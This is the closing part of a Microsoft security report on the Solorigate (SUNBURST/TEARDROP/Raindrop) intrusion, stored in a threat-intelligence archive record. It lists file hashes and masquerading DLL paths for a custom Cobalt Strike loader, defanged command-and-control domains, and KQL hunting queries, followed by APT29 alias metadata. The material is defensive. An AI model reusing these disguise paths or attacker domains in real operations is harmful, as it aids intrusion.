Solorigate can refer to Using Microsoft 365\nDefender to protect against Solorigate.\n\nMeanwhile, security administrators can use the recommendations for hardening networks against Solorigate\nand similar sophisticated cyberattacks outlined in Increasing resilience against Solorigate and other\nsophisticated attacks with Microsoft Defender.\n\n[To get the latest information and guidance from Microsoft, visit https://aka.ms/solorigate.](https://aka.ms/solorigate)\n\n_Microsoft 365 Defender Research Team_\n\n_Microsoft Threat Intelligence Center (MSTIC)_\n\n_Microsoft Cyber Defense Operations Center (CDOC)_\n\n## Indicators of compromise (IoCs)\n\n**Custom Cobalt Strike Beacon loader (SHA-256):**\n\n118189f90da3788362fe85eafa555298423e21ec37f147f3bf88c61d4cd46c51\n\n1817a5bf9c01035bcf8a975c9f1d94b0ce7f6a200339485d8f93859f8f6d730c\n\n1ec138f21a315722fb702706b4bdc0f544317f130f4a009502ec98345f85e4ad\n\n2a276f4b11f47f81dd2bcb850a158d4202df836769da5a23e56bf0353281473e\n\n327f1d94bc26779cbe20f8689be12c7eee2e390fbddb40b92ad00b1cddfd6426\n\n3985dea8e467c56e8cc44ebfc201253ffee923765d12808aaf17db2c644c4c06\n\n557f91404fb821d7c1e98d9f2f5296dc12712fc19c87a84602442b4637fb23d4\n\n5cf85c3d18cd6dba8377370883a0fffda59767839156add4c8912394f76d6ef0\n\n5f8650ca0ed22ad0d4127eb4086d4548ec31ad035c7aec12c6e82cb64417a390\n\n\n-----\n\n674075c8f63c64ad5fa6fd5e2aa6e4954afae594e7b0f07670e4322a60f3d0cf\n6ff3a4f7fd7dc793e866708ab0fe592e6c08156b1aa3552a8d74e331f1aea377\n7c68f8d80fc2a6347da7c196d5f91861ba889afb51a4da4a6c282e06ef5bdb7e\n915705c09b4bd108bcd123fe35f20a16d8c9c7d38d93820e8c167695a890b214\n948bfdfad43ad52ca09890a4d2515079c29bdfe02edaa53e7d92858aa2dfbe4c\n955609cf0b4ea38b409d523a0f675d8404fee55c458ad079b4031e02433fdbf3\nb348546f4c6a9bcafd81015132f09cf8313420eb653673bf3d65046427b1167f\nb35e0010e0734fcd9b5952ae93459544ae33485fe0662fae715092e0dfb92ad3\nb820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07\nbe9dbbec6937dfe0a652c0603d4972ba354e83c06b8397d6555fd1847da36725\nc5a818d9b95e1c548d6af22b5e8663a2410e6d4ed87df7f9daf7df0ef029872e\nc741797dd400de5927f8b5317165fc755d6439749c39c380a1357eac0a00f90c\nc7924cc1bc388cfcdc2ee2472899cd34a2ef4414134cbc23a7cb530650f93d98\nc96b7a3c9acf704189ae8d6124b5a7b1f0e8c83c246b59bc5ff15e17b7de4c84\ncbbe224d9854d6a4269ed2fa9b22d77681f84e3ca4e5d6891414479471f5ca68\ncdd9b4252ef2f6e64bccc91146ec5dc51d94e2761184cd0ffa9909aa739fa17e\ndbd26ccb3699f426dc6799e218b91d1a3c1d08ad3006bc2880e29c755a4e2338\ne60e1bb967db273b922deeea32d56fc6d9501a236856ef9a3e5f76c1f392000a\nf2d38a29f6727f4ade62d88d8a68de0d52a0695930b8c92437a2f9e4de92e418\nf61a37aa8581986ba600286d65bb76100fb44e347e253f1f5ad50051e5f882f5\nf81987f1484bfe5441be157250b35b0a2d7991cf9272fa4eacd3e9f0dee235de\n\n**File paths for the custom Cobalt Strike Beacon loader:**\n\nC:\\Windows\\ms\\sms\\sms.dll\nC:\\Windows\\Microsoft.NET\\Framework64\\sbscmp30.dll\nC:\\Windows\\AUInstallAgent\\auagent.dll\nC:\\Windows\\apppatch\\apppatch64\\sysmain.dll\nC:\\Windows\\Vss\\Writers\\Application\\AppXML.dll\nC:\\Windows\\PCHEALTH\\health.dll\nC:\\Windows\\Registration\\crmlog.dll\nC:\\Windows\\Cursors\\cursrv.dll\nC:\\Windows\\AppPatch\\AcWin.dll\nC:\\Windows\\CbsTemp\\cbst.dll\nC:\\Windows\\AppReadiness\\Appapi.dll\nC:\\Windows\\Panther\\MainQueueOnline.dll\nC:\\Windows\\AppReadiness\\AppRead.dll\nC:\\Windows\\PrintDialog\\PrintDial.dll\nC:\\Windows\\ShellExperiences\\MtUvc.dll\nC:\\Windows\\PrintDialog\\appxsig.dll\nC:\\Windows\\DigitalLocker\\lock.dll\nC:\\Windows\\assembly\\GAC_64\\MSBuild\\3.5.0.0__b03f5f7f11d50a3a\\msbuild.dll\nC:\\Windows\\Migration\\WTR\\ctl.dll\nC:\\Windows\\ELAMBKUP\\WdBoot.dll\nC:\\Windows\\LiveKernelReports\\KerRep.dll\nC:\\Windows\\Speech_OneCore\\Engines\\TTS\\en-US\\enUS.Name.dll\nC:\\Windows\\SoftwareDistribution\\DataStore\\DataStr.dll\nC:\\Windows\\RemotePackages\\RemoteApps\\RemPack.dll\nC:\\Windows\\ShellComponents\\TaskFlow.dll\n\n**Cobalt Strike Beacon:**\n\n\n-----\n\naimsecurity[.]net\ndatazr[.]com\nervsystem[.]com\nfinancialmarket[.]org\ngallerycenter[.]org\ninfinitysoftwares[.]com\nmobilnweb[.]com\nolapdatabase[.]com\nswipeservice[.]com\ntechiefly[.]com\n\n## Advanced hunting queries\n\nA collection of Advanced Hunting Queries (AHQ) related to Solorigate is located in our AHQ repository in\nGitHub. To locate possible exploitation activity related to the contents of this blog, you can run the\n[following advanced hunting queries via Microsoft Defender for Endpoint:](https://securitycenter.windows.com/hunting)\n\n**Anomalous usage of 7zip**\n\n[Look for anomalous usage or running process of 7zip. Run query in Microsoft Defender for Endpoint.](https://securitycenter.windows.com/hunting?query=H4sIAAAAAAAEAK1SwUrDQBB9Z8F_WEMPLVQP9SCCPRmFgoiIdwltalaaVrJRq4jf7puXrRZroGBZNjuZN_Nm9s2myPECjzHPG1RYyApcF_TnmKOmvY89fMDhFQV9FbfDiJgn6pHpO8fDL4ZLeme0rxlRKseiPtFFwrhn2hPiMxxjgCPiS-4EfcYlESnIFsj-g_aIZsrcpoNz2iVXk3GlGOvjAENVSXbENiZiSmXyBXHbXulm3ddS0yrdrt39jhmNNtbR6i-Iq8TTN8MjKxi3Q7rVxJw6cuhoAlNpuJ45UidDVe2QxfO2RUvUrqZf0Aq8U6WOPDUxjU7wLrUW9P9nCg27MR4SXeK0Vf9U3DlPzz6mUftJ9NZxBvf0NHhX7zHDW3ydm1Pqt0y196d2m_XPuAf4AmV4oXeMAwAA&runQuery=true&timeRangeId=month)\n```\nDeviceProcessEvents\n| where InitiatingProcessFileName in~(\"rundll32.exe\", \"dllhost.exe\") \nand InitiatingProcessCommandLine != \"\" \nand InitiatingProcessCommandLine !contains \" \"\n| extend RundllTime = Timestamp\n| join DeviceProcessEvents on $left.DeviceId == $right.DeviceId\n| where InitiatingProcessFileName hasprefix \"7z\" \nor InitiatingProcessCommandLine has \"-mx9\"\n| extend DateDiff = datetime_diff(\"day\", Timestamp, RundllTime)\n| where DateDiff < 2\n\n```\n**Presence of custom Cobalt Strike**\n\n[Look for presence of custom cobalt strike loaders. Run query in Microsoft Defender for Endpoint.](https://securitycenter.windows.com/hunting?query=H4sIAAAAAAAEAG2Qy2rCUBCG_7XgOxyy0eCF0q4URMULFaQUutOoiAYNGIVEbdW2z94v48oqYebMmfkvc9JVqKMiLTjflWhnVcrXox9qqz11Xjl9y-lTa3oJ4dSHtaF601yxdRr6JXvMD_CWTDd60bOqTL8I76HOAGyES4ROlrda_dtkYFuE9BNDnjS0rUP0nTGciqi_Uq9Q9lS2PT5ApsaMufkP3W-dOtQx39z2H5p2hoptt4XxUu6JbZO9yqmlAu5NsP7dywPQJXiB6kSAc2TzHVUKK-uNNbVzAtInAv7XVeHKHuNd0Vlt8khP5JpmoC84lPWD-x9xP1YuxAEAAA&runQuery=true&timeRangeId=month)\n```\nDeviceProcessEvents\n| where FileName =~ \"rundll32.exe\"\n| where InitiatingProcessIntegrityLevel in (\"High\", \"System\")\n| where ProcessCommandLine matches regex \n@'(?i)rundll32\\s+c\\:\\\\windows(\\\\[^\\\\]+)+\\.dll\\s+[a-zA-Z0-9_]{3,}'\n\n```\n**Command and control**\n\n[Look for command-and-control connections. Run query in Microsoft Defender for Endpoint.](https://securitycenter.windows.com/hunting?query=H4sIAAAAAAAEAK2QSwrCQBBEay14hzEHcKFrV35AEMkVQgwmmA_MxM9CPLtvOoIrQUSa7hmqqquGWanQRZVyzj3d66pOXietwQu1IEFjjXSXgyvBPO20hatgK2U2Wx2VwnXmFagUxr88Nihqy8jU2P5CD2aC4oziAFtrrpmmsDc6-TH1c9KQUaIN7L5zHMr4gm_cl9wbatjYmSZmTEiJGf9yy2Hiv2WGBfOO_QQYhXpxsAEAAA&runQuery=true&timeRangeId=month)\n```\nDeviceNetworkEvents\n| where InitiatingProcessParentFileName =~ \"rundll32.exe\"\n| where InitiatingProcessFileName =~ \"dllhost.exe\" \nand InitiatingProcessCommandLine != \"\" \nand InitiatingProcessCommandLine !contains \" \"\n\n```\nLook for network connections to known command and control domains. Run query in Microsoft Defender for\nEndpoint.\n\n\n-----\n\n```\n| where RemoteUrl in~('aimsecurity.net',\n'datazr.com',\n'ervsystem.com',\n'financialmarket.org',\n'gallerycenter.org',\n'infinitysoftwares.com',\n'mobilnweb.com',\n'olapdatabase.com',\n'swipeservice.com',\n'techiefly.com')\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-01-20 - Deep dive into the Solorigate second-stage activation- From SUNBURST to TEARDROP and Raindrop.pdf"
    ],
    "report_names": [
        "2021-01-20 - Deep dive into the Solorigate second-stage activation- From SUNBURST to TEARDROP and Raindrop.pdf"
    ],
    "threat_actors": [
        {
            "id": "b43e5ea9-d8c8-4efa-b5bf-f1efb37174ba",
            "created_at": "2022-10-25T16:07:24.36191Z",
            "updated_at": "2025-03-27T02:02:10.1909Z",
            "deleted_at": null,
            "main_name": "UNC2452",
            "aliases": [
                "Dark Halo",
                "Nobelium",
                "SolarStorm",
                "StellarParticle",
                "UNC2452"
            ],
            "source_name": "ETDA:UNC2452",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "70872c3a-e788-4b55-a7d6-b2df52001ad0",
            "created_at": "2023-01-06T13:46:39.18401Z",
            "updated_at": "2025-03-27T02:00:03.01553Z",
            "deleted_at": null,
            "main_name": "UNC2452",
            "aliases": [
                "DarkHalo",
                "StellarParticle",
                "NOBELIUM",
                "Solar Phoenix",
                "Midnight Blizzard"
            ],
            "source_name": "MISPGALAXY:UNC2452",
            "tools": [
                "SNOWYAMBER",
                "HALFRIG",
                "QUARTERRIG"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "1d3f9dec-b033-48a5-8b1e-f67a29429e89",
            "created_at": "2022-10-25T15:50:23.739197Z",
            "updated_at": "2025-03-27T02:00:55.536417Z",
            "deleted_at": null,
            "main_name": "UNC2452",
            "aliases": [
                "UNC2452",
                "NOBELIUM",
                "StellarParticle",
                "Dark Halo"
            ],
            "source_name": "MITRE:UNC2452",
            "tools": [
                "Sibot",
                "Mimikatz",
                "Cobalt Strike",
                "AdFind",
                "GoldMax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "a241a1ca-2bc9-450b-a07b-aae747ee2710",
            "created_at": "2024-06-19T02:03:08.150052Z",
            "updated_at": "2025-03-27T02:05:17.409596Z",
            "deleted_at": null,
            "main_name": "IRON RITUAL",
            "aliases": [
                "Blue Dev 5 ",
                "BlueBravo ",
                "Cloaked Ursa ",
                "CozyLarch ",
                "Dark Halo ",
                "Midnight Blizzard ",
                "NOBELIUM ",
                "StellarParticle ",
                "UNC2452 ",
                "APT29"
            ],
            "source_name": "Secureworks:IRON RITUAL",
            "tools": [
                " Cobalt Strike",
                " EnvyScout",
                " GoldFinder",
                " GoldMax",
                " NativeZone",
                " RAINDROP",
                " SUNBURST",
                " Sibot",
                " TEARDROP",
                " VaporRage",
                "Brute Ratel C4"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "20d3a08a-3b97-4b2f-90b8-92a89089a57a",
            "created_at": "2022-10-25T15:50:23.548494Z",
            "updated_at": "2025-03-27T02:00:55.49688Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "APT29",
                "IRON RITUAL",
                "IRON HEMLOCK",
                "NobleBaron",
                "Dark Halo",
                "NOBELIUM",
                "UNC2452",
                "YTTRIUM",
                "The Dukes",
                "Cozy Bear",
                "CozyDuke",
                "SolarStorm",
                "Blue Kitsune",
                "UNC3524",
                "Midnight Blizzard"
            ],
            "source_name": "MITRE:APT29",
            "tools": [
                "PinchDuke",
                "ROADTools",
                "WellMail",
                "CozyCar",
                "Mimikatz",
                "Tasklist",
                "OnionDuke",
                "FatDuke",
                "POSHSPY",
                "EnvyScout",
                "SoreFang",
                "GeminiDuke",
                "GoldMax",
                "FoggyWeb",
                "SDelete",
                "PolyglotDuke",
                "AADInternals",
                "MiniDuke",
                "SeaDuke",
                "Sibot",
                "RegDuke",
                "CloudDuke",
                "GoldFinder",
                "AdFind",
                "PsExec",
                "NativeZone",
                "Systeminfo",
                "ipconfig",
                "Impacket",
                "Cobalt Strike",
                "PowerDuke",
                "QUIETEXIT",
                "HAMMERTOSS",
                "BoomBox",
                "CosmicDuke",
                "WellMess",
                "VaporRage",
                "LiteDuke"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "46b3c0fc-fa0c-4d63-a38a-b33a524561fb",
            "created_at": "2023-01-06T13:46:38.393409Z",
            "updated_at": "2025-03-27T02:00:02.822155Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "The Dukes",
                "Minidionis",
                "Grizzly Steppe",
                "G0016",
                "Blue Kitsune",
                "BlueBravo",
                "SeaDuke",
                "Cloaked Ursa",
                "YTTRIUM",
                "ATK7",
                "Nobelium",
                "UAC-0029",
                "Group 100",
                "COZY BEAR",
                "IRON HEMLOCK",
                "TA421",
                "ITG11"
            ],
            "source_name": "MISPGALAXY:APT29",
            "tools": [
                "QUARTERRIG",
                "SNOWYAMBER",
                "HALFRIG"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f27790ff-4ee0-40a5-9c84-2b523a9d3270",
            "created_at": "2022-10-25T16:07:23.341684Z",
            "updated_at": "2025-03-27T02:02:09.74554Z",
            "deleted_at": null,
            "main_name": "APT 29",
            "aliases": [
                "APT 29",
                "ATK 7",
                "Blue Dev 5",
                "BlueBravo",
                "Cloaked Ursa",
                "CloudLook",
                "Cozy Bear",
                "Dark Halo",
                "Earth Koshchei",
                "Grizzly Steppe",
                "Group 100",
                "ITG11",
                "Iron Hemlock",
                "Iron Ritual",
                "Midnight Blizzard",
                "Minidionis",
                "Nobelium",
                "NobleBaron",
                "Operation Ghost",
                "Operation Office monkeys",
                "Operation StellarParticle",
                "SilverFish",
                "Solar Phoenix",
                "SolarStorm",
                "StellarParticle",
                "TEMP.Monkeys",
                "The Dukes",
                "UNC2452",
                "UNC3524",
                "Yttrium"
            ],
            "source_name": "ETDA:APT 29",
            "tools": [
                "7-Zip",
                "ATI-Agent",
                "AdFind",
                "Agentemis",
                "AtNow",
                "BEATDROP",
                "BotgenStudios",
                "CEELOADER",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobalt Strike",
                "CobaltStrike",
                "CosmicDuke",
                "Cozer",
                "CozyBear",
                "CozyCar",
                "CozyDuke",
                "Danfuan",
                "EnvyScout",
                "EuroAPT",
                "FatDuke",
                "FoggyWeb",
                "GeminiDuke",
                "Geppei",
                "GoldFinder",
                "GoldMax",
                "GraphDrop",
                "GraphicalNeutrino",
                "GraphicalProton",
                "HAMMERTOSS",
                "HammerDuke",
                "LOLBAS",
                "LOLBins",
                "LiteDuke",
                "Living off the Land",
                "MagicWeb",
                "Mimikatz",
                "MiniDionis",
                "MiniDuke",
                "NemesisGemina",
                "NetDuke",
                "OnionDuke",
                "POSHSPY",
                "PinchDuke",
                "PolyglotDuke",
                "PowerDuke",
                "QUIETEXIT",
                "ROOTSAW",
                "RegDuke",
                "Rubeus",
                "SNOWYAMBER",
                "SPICYBEAT",
                "SUNSHUTTLE",
                "SeaDaddy",
                "SeaDask",
                "SeaDesk",
                "SeaDuke",
                "Sharp-SMBExec",
                "SharpView",
                "Sibot",
                "Solorigate",
                "SoreFang",
                "TinyBaron",
                "WINELOADER",
                "WellMail",
                "WellMess",
                "cobeacon",
                "elf.wellmess",
                "reGeorg",
                "tDiscoverer"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536071,
    "ts_updated_at": 1743041794,
    "ts_creation_date": 1653779265,
    "ts_modification_date": 1653779265,
    "files": {
        "pdf": "https://archive.orkl.eu/6aca2cd983db89aeb07da880561edc8135056b55.pdf",
        "text": "https://archive.orkl.eu/6aca2cd983db89aeb07da880561edc8135056b55.txt",
        "img": "https://archive.orkl.eu/6aca2cd983db89aeb07da880561edc8135056b55.jpg"
    }
}